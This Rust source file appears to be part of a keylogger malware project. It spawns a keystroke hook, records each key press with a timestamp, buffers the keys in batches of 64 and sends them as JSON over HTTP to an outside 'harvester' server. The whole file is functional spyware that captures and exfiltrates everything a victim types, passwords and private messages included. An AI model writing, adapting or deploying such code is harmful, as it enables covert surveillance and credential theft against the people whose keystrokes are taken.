use chrono::{Datelike, NaiveDateTime, Utc};
use log::{error, info};
use oxalate_keylogger::spawn_keylogger;
use reqwest::{Client, StatusCode, header::HeaderName};
use serde::Serialize;

use crate::HARVESTER_URL;

#[derive(Serialize)]
pub struct Req {
    keys: Vec<Key>,
}

#[derive(Serialize)]
pub struct Key {
    at: NaiveDateTime,
    key_pressed: String,
}

const KEY_BUFFERING: usize = 64;

pub fn keylogger(reqwest_client: Client) {
    let mut rx = spawn_keylogger();
    tokio::spawn(async move {
        let mut req = Req {
            keys: Vec::with_capacity(KEY_BUFFERING),
        };
        loop {
            if req.keys.len() >= KEY_BUFFERING {
                let json_body = serde_json::to_string(&req).unwrap();
                let res = reqwest_client
                    .post(format!("http://{}/keylogger", *HARVESTER_URL))
                    .header("Content-Type", "application/json")
                    .body(json_body)
                    .send()
                    .await;
                match res {
                    Ok(e) if e.status() == 200 => {
                        info!("send keylogs to /keylogger");
                        req.keys.clear();
                    }
                    Ok(e) => {
                        let status = e.status();
                        let body = e.text().await.unwrap();
                        info!(
                            "failed sending keylogs with status code: {}, and body: {}",
                            status, body
                        )
                    }
                    Err(err) => error!("failed to send keystrokes: {err}"),
                }
            }

            let key = rx.recv().await.unwrap();
            let now = Utc::now().naive_utc();
            let key = Key {
                at: now,
                key_pressed: format!("{key:?}"),
            };
            req.keys.push(key);
        }
    });
}
